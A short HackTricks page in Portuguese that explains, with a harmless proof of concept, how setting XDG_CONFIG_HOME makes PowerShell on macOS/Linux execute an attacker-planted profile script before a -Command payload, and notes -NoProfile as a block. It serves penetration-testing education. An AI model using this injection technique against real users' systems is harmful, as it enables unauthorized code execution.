# Injeção de aplicações PowerShell no macOS

{{#include ../../../banners/hacktricks-training.md}}

## `XDG_CONFIG_HOME` e perfis do PowerShell

No macOS e no Linux, o PowerShell usa caminhos de configuração XDG e executa scripts de perfil do usuário quando o `pwsh` é iniciado. Redirecionar `XDG_CONFIG_HOME` altera o diretório que contém `powershell/profile.ps1` e o arquivo específico do host do console `powershell/Microsoft.PowerShell_profile.ps1`; portanto, um arquivo controlado nesse local pode ser executado antes de um payload `-Command`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Isso se aplica ao PowerShell 6+ (`pwsh`) em plataformas não Windows; o Windows PowerShell usa locais de perfil diferentes. `pwsh -NoProfile` impede o carregamento dos perfis. Verifique também `HOME` e os nomes de perfil específicos do host, pois outros hosts do PowerShell podem selecionar scripts diferentes.

## References

- [1] [Variáveis de ambiente do PowerShell e caminhos XDG](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [Perfis do PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
{{#include ../../../banners/hacktricks-training.md}}
